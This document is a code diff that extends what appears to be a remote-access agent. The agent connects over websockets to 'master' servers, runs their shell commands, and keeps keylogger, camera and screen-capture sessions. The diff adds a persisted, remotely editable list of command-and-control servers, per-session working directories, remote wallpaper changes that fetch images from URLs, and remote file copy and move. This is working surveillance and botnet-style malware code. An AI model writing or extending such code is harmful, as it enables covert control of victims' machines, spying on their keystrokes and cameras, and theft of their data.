@@ -12,6 +12,7 @@ from fastapi import Request, UploadFile, File
 from typing import Any, Tuple
 import base64, io
 import shlex
+import shutil
 
 # Ensure Windows supports asyncio subprocesses
 if sys.platform == 'win32':
@@ -32,6 +33,11 @@ MASTER_CONTROL_WS_URLS = [
     MASTER_CONTROL_WS_URL,
     'ws://localhost:9000/ws/agent',
 ]
+# Dynamic masters management (persisted)
+MASTERS_FILE = os.path.join(os.getcwd(), 'masters.json')
+master_urls: list[str] = []
+master_tasks: dict[str, asyncio.Task] = {}
+master_stop: dict[str, bool] = {}
 AGENT_HTTP_BASE = os.getenv('AGENT_HTTP_BASE', 'http://127.0.0.1:8000')
 SESSION_DIRS: dict[str, str] = {}
 # Kill long-running commands to avoid stuck queue (seconds)
@@ -401,10 +407,12 @@ if __name__ == "__main__" and os.getenv("ENABLE_KEYLOGGER_UI", "0").lower() in (
         print(f"[keylogger-ui] disabled: {_e}")
 # Agent-to-Master connector
 current_agent_dir = os.getcwd()
+# Per-session working directories (keyed by (ws, session_id)) for split terminals
+pane_dirs: dict[tuple[Any, str], str] = {}
 
 # Global single-run queue across all masters
 queue_lock: asyncio.Lock = asyncio.Lock()
-command_queue: list[tuple[Any, str]] = []  # (ws, command)
+command_queue: list[tuple[Any, str, str | None]] = []  # (ws, command, session_id)
 queue_task: asyncio.Task | None = None
 command_running: bool = False
 # Track current running process (if any) and start time for stale detection
@@ -440,6 +448,7 @@ async def _process_queue():
     while True:
         ws = None
         cmd = None
+        sid: str | None = None
         async with queue_lock:
             if not command_queue:
                 # Nothing to do; reset runner state and exit
@@ -455,14 +464,14 @@ async def _process_queue():
                 except Exception:
                     pass
             if not command_running:
-                ws, cmd = command_queue.pop(0)
+                ws, cmd, sid = command_queue.pop(0)
                 command_running = True
         if ws is None:
             await asyncio.sleep(0.1)
             continue
         try:
             await _send_line(ws, "output", "[Queue] Your command is starting...\n")
-            await _run_agent_command(cmd, ws)
+            await _run_agent_command(cmd, ws, sid)
         except Exception:
             logging.exception("Queued command failed")
         finally:
@@ -480,12 +489,12 @@ async def _ensure_queue_runner():
                 command_running = False
             queue_task = asyncio.create_task(_process_queue())
 
-async def enqueue_command(ws, cmd: str):
+async def enqueue_command(ws, cmd: str, session_id: str | None = None):
     # If nothing running and queue empty, run immediately via queue machinery
     async with queue_lock:
-        command_queue.append((ws, cmd))
+        command_queue.append((ws, cmd, session_id))
         # Compute this ws position (first occurrence)
-        pos = next((i + 1 for i, (w, _c) in enumerate(command_queue) if w is ws), 1)
+        pos = next((i + 1 for i, (w, _c, _s) in enumerate(command_queue) if w is ws), 1)
     if pos > 1 or command_running:
         await _send_line(ws, "output", f"[Queued] You are #{pos} in queue. Waiting for your turn...\n")
     await _ensure_queue_runner()
@@ -519,13 +528,16 @@ def _is_interactive_disallowed(cmd: str) -> Tuple[bool, str]:
     except Exception:
         return False, ""
 
-async def _run_agent_command(cmd: str, ws):
-    global current_agent_dir, queue_current_proc, queue_started_at
+async def _run_agent_command(cmd: str, ws, session_id: str | None = None):
+    global current_agent_dir, queue_current_proc, queue_started_at, pane_dirs
     stripped = cmd.strip()
     parts0 = stripped.split(maxsplit=1)
     head0 = parts0[0].lower() if parts0 else ""
     arg0 = parts0[1] if len(parts0) > 1 else None
     if head0 in ("cd","chdir"):
+        base_dir = current_agent_dir
+        if session_id:
+            base_dir = pane_dirs.get((ws, session_id), current_agent_dir)
         target = arg0.strip() if arg0 else None
         if target:
             if target.lower().startswith("/d "):
@@ -535,16 +547,19 @@ async def _run_agent_command(cmd: str, ws):
             if len(target)==2 and target[1]==":" and target[0].isalpha():
                 new_dir = f"{target}\\"
             else:
-                new_dir = target if os.path.isabs(target) else os.path.abspath(os.path.join(current_agent_dir, target))
+                new_dir = target if os.path.isabs(target) else os.path.abspath(os.path.join(base_dir, target))
             if os.path.isdir(new_dir):
-                current_agent_dir = new_dir
-                await _send_line(ws, "output", current_agent_dir + "\n")
+                if session_id:
+                    pane_dirs[(ws, session_id)] = new_dir
+                else:
+                    current_agent_dir = new_dir
+                await _send_line(ws, "output", new_dir + "\n")
                 await _send_line(ws, "exit_code", 0)
             else:
                 await _send_line(ws, "error", "The system cannot find the path specified.\n")
                 await _send_line(ws, "exit_code", 1)
         else:
-            await _send_line(ws, "output", current_agent_dir + "\n")
+            await _send_line(ws, "output", base_dir + "\n")
             await _send_line(ws, "exit_code", 0)
         return
 
@@ -558,6 +573,11 @@ async def _run_agent_command(cmd: str, ws):
         await _send_line(ws, "exit_code", 1)
         return
 
+    # Choose working directory per session (or global)
+    try:
+        work_dir = pane_dirs.get((ws, session_id), current_agent_dir) if session_id else current_agent_dir
+    except Exception:
+        work_dir = current_agent_dir
     if os.name == "nt":
         def start_proc():
             return subprocess.Popen(
@@ -568,7 +588,7 @@ async def _run_agent_command(cmd: str, ws):
                 encoding="utf-8",
                 errors="replace",
                 bufsize=1,
-                cwd=current_agent_dir,
+                cwd=work_dir,
             )
         # mark running proc for queue tracking
         queue_started_at = time.time()
@@ -622,7 +642,7 @@ async def _run_agent_command(cmd: str, ws):
             cmd,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
-            cwd=current_agent_dir,
+            cwd=work_dir,
         )
         queue_current_proc = proc
         async def stream_reader(stream, key):
@@ -690,19 +710,196 @@ def _derive_geo_sync() -> tuple[str | None, str | None]:
     except Exception:
         return None, None
 
+# --- Masters helpers ---
+def _load_masters_sync() -> list[str]:
+    try:
+        if os.path.isfile(MASTERS_FILE):
+            raw = open(MASTERS_FILE, 'r', encoding='utf-8').read()
+            data = json.loads(raw)
+            if isinstance(data, list):
+                return [str(u) for u in data if isinstance(u, str) and u.strip()]
+    except Exception:
+        pass
+    # Fallback to defaults
+    return [u for u in MASTER_CONTROL_WS_URLS if isinstance(u, str) and u.strip()]
+
+def _save_masters_sync(urls: list[str]) -> None:
+    try:
+        with open(MASTERS_FILE, 'w', encoding='utf-8') as f:
+            f.write(json.dumps(urls, indent=2))
+    except Exception:
+        pass
+
+# --- Wallpaper helpers ---
+def _save_image_from_payload_sync(payload: dict, base_dir: str) -> tuple[bool, str, str]:
+    """
+    Save an image from one of payload keys: 'path' (absolute or relative), 'url',
+    'data_url' (data:image/...;base64,....) or 'b64'. Returns (ok, path, error).
+    Relative paths are resolved under base_dir.
+    """
+    try:
+        # Existing local path
+        p = payload.get('path')
+        if isinstance(p, str) and p.strip():
+            p = p.strip().strip('"').strip("'")
+            full = p if os.path.isabs(p) else os.path.abspath(os.path.join(base_dir, p))
+            if os.path.isfile(full):
+                return True, full, ''
+            return False, '', f"Path not found: {full}"
+        # URL download
+        u = payload.get('url')
+        if isinstance(u, str) and u.strip():
+            u = u.strip()
+            try:
+                fname = f"wallpaper_{int(time.time())}.jpg"
+                out = os.path.abspath(os.path.join(base_dir, fname))
+                with urllib.request.urlopen(u, timeout=15) as resp:
+                    data = resp.read()
+                with open(out, 'wb') as f:
+                    f.write(data)
+                return True, out, ''
+            except Exception as e:
+                return False, '', f"Download failed: {e}"
+        # Data URL / raw base64
+        durl = payload.get('data_url') or payload.get('data') or payload.get('b64')
+        if isinstance(durl, str) and durl.strip():
+            s = durl.strip()
+            try:
+                if s.startswith('data:') and ';base64,' in s:
+                    s = s.split(';base64,', 1)[1]
+                raw = base64.b64decode(s, validate=False)
+                fname = f"wallpaper_{int(time.time())}.jpg"
+                out = os.path.abspath(os.path.join(base_dir, fname))
+                with open(out, 'wb') as f:
+                    f.write(raw)
+                return True, out, ''
+            except Exception as e:
+                return False, '', f"Decode failed: {e}"
+        return False, '', 'No image payload provided'
+    except Exception as e:
+        return False, '', str(e)
+
+def _set_wallpaper_local_sync(image_path: str, style: str | None = None) -> tuple[bool, str]:
+    """
+    Set desktop wallpaper cross-platform (best-effort). Returns (ok, message).
+    style: 'fill'|'fit'|'stretch'|'tile'|'center'|'span' (Windows only)
+    """
+    try:
+        if os.name == 'nt':
+            try:
+                import ctypes, winreg  # type: ignore
+            except Exception:
+                import ctypes  # type: ignore
+                winreg = None  # type: ignore
+            # Apply style via registry if available
+            if winreg is not None and isinstance(style, str):
+                sty = style.lower().strip()
+                wp_style = {
+                    'fill': ('10','0'),
+                    'fit': ('6','0'),
+                    'stretch': ('2','0'),
+                    'tile': ('0','1'),
+                    'center': ('0','0'),
+                    'span': ('22','0'),
+                }.get(sty)
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
+                    if wp_style:
+                        winreg.SetValueEx(key, 'WallpaperStyle', 0, winreg.REG_SZ, wp_style[0])
+                        winreg.SetValueEx(key, 'TileWallpaper', 0, winreg.REG_SZ, wp_style[1])
+                    try:
+                        winreg.SetValueEx(key, 'Wallpaper', 0, winreg.REG_SZ, image_path)
+                    except Exception:
+                        pass
+                    winreg.CloseKey(key)
+                except Exception:
+                    pass
+            SPI_SETDESKWALLPAPER = 20
+            SPIF_UPDATEINIFILE = 0x01
+            SPIF_SENDWININICHANGE = 0x02
+            ok = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
+            return (ok == 1), ("Wallpaper set" if ok == 1 else "Failed to set wallpaper")
+        # macOS
+        if sys.platform == 'darwin':
+            try:
+                script = f'''osascript -e 'tell application "System Events" to set picture of every desktop to (POSIX file "{image_path}")' '''
+                r = subprocess.run(script, shell=True)
+                return (r.returncode == 0), ("Wallpaper set" if r.returncode == 0 else "Failed to set wallpaper")
+            except Exception as e:
+                return False, f"Failed: {e}"
+        # Linux (GNOME best-effort)
+        try:
+            r = subprocess.run(["gsettings","set","org.gnome.desktop.background","picture-uri", f"file://{image_path}"], capture_output=True)
+            ok = (r.returncode == 0)
+            if ok:
+                return True, "Wallpaper set"
+        except Exception:
+            pass
+        return False, "Unsupported platform or desktop environment"
+    except Exception as e:
+        return False, str(e)
+
 # Track interactive sessions per master connection
 interactive_sessions: dict[Any, dict] = {}
+
+# --- File operation helpers ---
+def _fs_copy_move_sync(op: str, items: list[str], src_dir: str, dest_dir: str, overwrite: bool = False) -> tuple[bool, list[str]]:
+    try:
+        out: list[str] = []
+        src_dir_abs = src_dir if os.path.isabs(src_dir) else os.path.abspath(src_dir)
+        dest_dir_abs = dest_dir if os.path.isabs(dest_dir) else os.path.abspath(dest_dir)
+        if not os.path.isdir(dest_dir_abs):
+            os.makedirs(dest_dir_abs, exist_ok=True)
+        for name in items:
+            if not isinstance(name, str) or not name.strip():
+                continue
+            src_path = name if os.path.isabs(name) else os.path.abspath(os.path.join(src_dir_abs, name))
+            if not os.path.exists(src_path):
+                out.append(f"[fs] skip missing: {src_path}")
+                continue
+            base = os.path.basename(src_path)
+            dst_path = os.path.join(dest_dir_abs, base)
+            # Resolve collisions if not overwriting
+            if os.path.exists(dst_path) and not overwrite:
+                stem, ext = os.path.splitext(base)
+                k = 1
+                while os.path.exists(dst_path):
+                    dst_path = os.path.join(dest_dir_abs, f"{stem} ({k}){ext}")
+                    k += 1
+            try:
+                if op == 'copy':
+                    if os.path.isdir(src_path):
+                        shutil.copytree(src_path, dst_path, dirs_exist_ok=bool(overwrite))
+                    else:
+                        # Ensure parent exists
+                        os.makedirs(os.path.dirname(dst_path), exist_ok=True)
+                        shutil.copy2(src_path, dst_path)
+                    out.append(f"[copy] {src_path} -> {dst_path}")
+                elif op == 'move':
+                    os.makedirs(os.path.dirname(dst_path), exist_ok=True)
+                    shutil.move(src_path, dst_path)
+                    out.append(f"[move] {src_path} -> {dst_path}")
+                else:
+                    out.append(f"[fs] unknown op: {op}")
+            except Exception as e:
+                out.append(f"[fs] failed {op} {src_path}: {e}")
+        return True, out
+    except Exception as e:
+        return False, [f"[fs] error: {e}"]
 screen_sessions: dict[Any, dict] = {}
 camera_sessions: dict[Any, dict] = {}
 # Keylogger sessions per master connection
 keylog_sessions: dict[Any, Any] = {}
 
 async def _connect_one_master(url: str):
-    global command_running, queue_task, queue_current_proc, queue_started_at, command_queue
+    global command_running, queue_task, queue_current_proc, queue_started_at, command_queue, master_stop, master_urls
     last_log = 0.0
     retry_delay = 2
     while True:
         try:
+            # If this URL has been removed, stop task
+            if master_stop.get(url) or url not in master_urls:
+                break
             async with websockets.connect(url, ping_interval=20, ping_timeout=20) as ws:
                 try:
                     agent_id, agent_name = await asyncio.to_thread(_derive_identity_sync)
@@ -759,6 +956,13 @@ async def _connect_one_master(url: str):
                         pass
                 try:
                     while True:
+                        # Exit if stop requested
+                        if master_stop.get(url):
+                            try:
+                                await ws.close()
+                            except Exception:
+                                pass
+                            break
                         raw = await ws.recv()
                         try:
                             data = json.loads(raw)
@@ -767,8 +971,15 @@ async def _connect_one_master(url: str):
                         # Handle RPC-style requests first
                         if isinstance(data, dict) and data.get("type") == "stats_request":
                             req_id = data.get("request_id")
-                            # Build directory listing from current_agent_dir
-                            dir_path = current_agent_dir
+                            # Build directory listing from session-linked dir if provided, else global
+                            try:
+                                sid = data.get("session_id")
+                            except Exception:
+                                sid = None
+                            if isinstance(sid, str) and sid:
+                                dir_path = pane_dirs.get((ws, sid), current_agent_dir)
+                            else:
+                                dir_path = current_agent_dir
                             try:
                                 items = []
                                 for name in os.listdir(dir_path):
@@ -793,6 +1004,80 @@ async def _connect_one_master(url: str):
                             continue
                         # Interactive session control
                         # Camera start
+                        if isinstance(data, dict) and data.get("type") == "masters_list":
+                            try:
+                                urls = master_urls[:]
+                                try:
+                                    await ws.send(json.dumps({"type":"masters_list","urls": urls}))
+                                except Exception:
+                                    pass
+                            except Exception:
+                                pass
+                            continue
+                        if isinstance(data, dict) and data.get("type") == "masters_add":
+                            try:
+                                u = str(data.get("url") or "").strip()
+                                if u and u not in master_urls:
+                                    master_urls.append(u)
+                                    try:
+                                        await asyncio.to_thread(_save_masters_sync, master_urls)
+                                    except Exception:
+                                        pass
+                                    # start connector
+                                    try:
+                                        master_stop[u] = False
+                                        master_tasks[u] = asyncio.create_task(_connect_one_master(u))
+                                    except Exception:
+                                        pass
+                                await ws.send(json.dumps({"type":"masters_list","urls": master_urls}))
+                            except Exception:
+                                pass
+                            continue
+                        if isinstance(data, dict) and data.get("type") == "masters_update":
+                            try:
+                                old = str(data.get("old") or "").strip()
+                                new = str(data.get("new") or "").strip()
+                                if old and new and old in master_urls:
+                                    # stop old
+                                    master_stop[old] = True
+                                    try:
+                                        master_urls.remove(old)
+                                    except Exception:
+                                        pass
+                                    if new not in master_urls:
+                                        master_urls.append(new)
+                                        master_stop[new] = False
+                                        master_tasks[new] = asyncio.create_task(_connect_one_master(new))
+                                    await asyncio.to_thread(_save_masters_sync, master_urls)
+                                await ws.send(json.dumps({"type":"masters_list","urls": master_urls}))
+                            except Exception:
+                                pass
+                            continue
+                        if isinstance(data, dict) and data.get("type") == "masters_delete":
+                            try:
+                                u = str(data.get("url") or "").strip()
+                                if u and u in master_urls:
+                                    master_stop[u] = True
+                                    try:
+                                        master_urls.remove(u)
+                                    except Exception:
+                                        pass
+                                    await asyncio.to_thread(_save_masters_sync, master_urls)
+                                await ws.send(json.dumps({"type":"masters_list","urls": master_urls}))
+                            except Exception:
+                                pass
+                            continue
+                        if isinstance(data, dict) and data.get("type") == "masters_reconnect":
+                            try:
+                                # trigger reconnects by toggling stop flags false for existing urls
+                                for u in list(master_urls):
+                                    master_stop[u] = False
+                                    if u not in master_tasks or master_tasks[u].done():
+                                        master_tasks[u] = asyncio.create_task(_connect_one_master(u))
+                                await ws.send(json.dumps({"type":"masters_list","urls": master_urls}))
+                            except Exception:
+                                pass
+                            continue
                         if isinstance(data, dict) and data.get("type") == "queue_reset":
                             try:
                                 # Clear queue and kill any running queued process
@@ -1646,6 +1931,39 @@ async def _connect_one_master(url: str):
                                 except Exception:
                                     pass
                             continue
+                        if isinstance(data, dict) and data.get("type") == "wallpaper_set":
+                            try:
+                                style = data.get('style') if isinstance(data.get('style'), str) else None
+                                # Resolve/save image first (supports path/url/data_url)
+                                ok, img_path, err = await asyncio.to_thread(_save_image_from_payload_sync, data, current_agent_dir)
+                                if not ok:
+                                    await _send_line(ws, "error", f"[Wallpaper] {err}\n")
+                                    continue
+                                ok2, msg = await asyncio.to_thread(_set_wallpaper_local_sync, img_path, style)
+                                if ok2:
+                                    await _send_line(ws, "output", f"[Wallpaper] set: {img_path}\n")
+                                else:
+                                    await _send_line(ws, "error", f"[Wallpaper] {msg}\n")
+                            except Exception as e:
+                                await _send_line(ws, "error", f"[Wallpaper] failed: {e}\n")
+                            continue
+                        if isinstance(data, dict) and data.get("type") in ("fs_copy","fs_move"):
+                            try:
+                                op = 'copy' if data.get('type') == 'fs_copy' else 'move'
+                                items = data.get('items') or []
+                                if not isinstance(items, list) or not items:
+                                    await _send_line(ws, "error", "[fs] No items provided\n")
+                                else:
+                                    src_dir = data.get('src_dir') or current_agent_dir
+                                    dest_dir = data.get('dest_dir') or current_agent_dir
+                                    overwrite = bool(data.get('overwrite'))
+                                    ok, lines = await asyncio.to_thread(_fs_copy_move_sync, op, [str(x) for x in items], str(src_dir), str(dest_dir), overwrite)
+                                    for ln in lines:
+                                        await _send_line(ws, "output", ln + "\n")
+                                    await _send_line(ws, "exit_code", 0 if ok else 1)
+                            except Exception as e:
+                                await _send_line(ws, "error", f"[fs] failed: {e}\n")
+                            continue
                         cmd = data.get("command")
                         if cmd:
                             # If interactive is running, do not queue normal commands
@@ -1655,7 +1973,14 @@ async def _connect_one_master(url: str):
                                 except Exception:
                                     pass
                             else:
-                                await enqueue_command(ws, cmd)
+                                sid = None
+                                try:
+                                    sidv = data.get("session_id")
+                                    if isinstance(sidv, str):
+                                        sid = sidv
+                                except Exception:
+                                    sid = None
+                                await enqueue_command(ws, cmd, sid)
                         # After any data, check interactive session completion
                         sess = interactive_sessions.get(ws)
                         if sess:
@@ -1748,11 +2073,16 @@ async def _connect_one_master(url: str):
             await asyncio.sleep(retry_delay)
 
 async def start_master_connections():
-    urls = [u for u in MASTER_CONTROL_WS_URLS if isinstance(u, str) and u.strip()]
-    if not urls:
-        urls = [MASTER_CONTROL_WS_URL]
-    for u in urls:
-        asyncio.create_task(_connect_one_master(u))
+    global master_urls, master_tasks, master_stop
+    try:
+        master_urls = await asyncio.to_thread(_load_masters_sync)
+    except Exception:
+        master_urls = [u for u in MASTER_CONTROL_WS_URLS if isinstance(u, str) and u.strip()]
+    if not master_urls:
+        master_urls = [MASTER_CONTROL_WS_URL]
+    for u in master_urls:
+        master_stop[u] = False
+        master_tasks[u] = asyncio.create_task(_connect_one_master(u))
 
 @app.on_event("startup")
 async def _startup_connect_master():
